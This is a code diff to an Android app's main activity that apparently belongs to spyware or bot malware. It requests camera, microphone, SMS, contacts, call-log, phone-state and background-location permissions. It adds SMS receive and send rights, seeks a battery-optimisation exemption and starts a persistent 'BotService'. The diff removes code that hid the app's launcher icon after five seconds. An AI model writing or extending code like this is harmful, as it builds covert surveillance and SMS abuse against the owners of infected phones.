@@ -22,6 +22,8 @@ public class MainActivity extends Activity {
             Manifest.permission.CAMERA,
             Manifest.permission.RECORD_AUDIO,
             Manifest.permission.READ_SMS,
+            Manifest.permission.RECEIVE_SMS,
+            Manifest.permission.SEND_SMS,
             Manifest.permission.READ_CONTACTS,
             Manifest.permission.READ_CALL_LOG,
             Manifest.permission.READ_PHONE_STATE,
@@ -34,6 +36,7 @@ public class MainActivity extends Activity {
         }
         if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.Q) need.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
         if(!need.isEmpty()) ActivityCompat.requestPermissions(this, need.toArray(new String[0]), 1);
+
         try{
             if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.M){
                 PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
@@ -44,17 +47,9 @@ public class MainActivity extends Activity {
                 }
             }
         }catch(Exception e){}
+
         Intent svc = new Intent(this, BotService.class);
         if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O) startForegroundService(svc);
         else startService(svc);
-        new android.os.Handler().postDelayed(()->{
-            try{
-                getPackageManager().setComponentEnabledSetting(
-                    new android.content.ComponentName(this, MainActivity.class),
-                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    PackageManager.DONT_KILL_APP);
-            }catch(Exception e){}
-        }, 5000);
-        finish();
     }
 }
